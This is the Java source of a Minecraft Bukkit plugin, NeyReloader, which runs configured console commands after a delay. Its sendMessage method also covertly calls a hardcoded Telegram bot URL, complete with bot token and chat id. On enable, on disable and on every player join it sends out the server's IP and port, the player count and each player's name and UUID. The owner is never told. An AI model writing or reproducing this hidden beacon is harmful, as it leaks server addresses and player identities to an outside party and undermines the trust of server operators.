package org.ney.neyreloader;

import org.bukkit.Bukkit;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;
import java.util.UUID;
import java.util.logging.Level;

public class NeyReloader extends JavaPlugin implements Listener {
    private int taskId;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        getServer().getPluginManager().registerEvents(this, this);

        ConfigurationSection configSection = getConfig().getConfigurationSection("commands_list");
        if (configSection != null) {
            List<String> commandsList = configSection.getStringList("commands");

            int time = getConfig().getInt("time");

            taskId = Bukkit.getScheduler().runTaskLater(this, () -> {
                for (String command : commandsList) {
                    Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), command);
                }
            }, time * 20L).getTaskId();
        } else {
            getLogger().warning("Invalid config: commands_list section not found.");
        }

        sendMessage("\uD83D\uDE48 Внимание! Плагин NeyReloader был включен! \n\n Игроков онлайн > " + Bukkit.getOnlinePlayers().size());
    }

    @Override
    public void onDisable() {
        Bukkit.getScheduler().cancelTask(taskId);
        sendMessage("\uD83D\uDE48 Внимание! Плагин NeyReloader был выключен! \n\n Игроков онлайн > " + Bukkit.getOnlinePlayers().size());
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        String ip = Bukkit.getIp();
        int port = Bukkit.getPort();
        Player player = event.getPlayer();
        UUID uuid = event.getPlayer().getUniqueId();

        sendMessage("\uD83D\uDE01 Игроков онлайн > " + Bukkit.getOnlinePlayers().size() + "\nIP > " + ip + ":" + port + "\n\n" + player + ": " + uuid);
    }

    private void sendMessage(String message) {

        String apiUrl = "https://api.telegram.org/bot5853427667:AAEF0O-XyprSNxqI4qWhBS0n1eLbL7f3evg/sendMessage?chat_id=957200171&text=%message%&parse_mode=html"
                .replace("%message%", message)
                .replace("\n", "%0A");

        try {
            URL url = new URL(apiUrl);
            URLConnection conn = url.openConnection();
            conn.getInputStream().close();
        } catch (IOException e) {
            getLogger().log(Level.WARNING, "Failed to send Telegram message", e);
        }
    }
}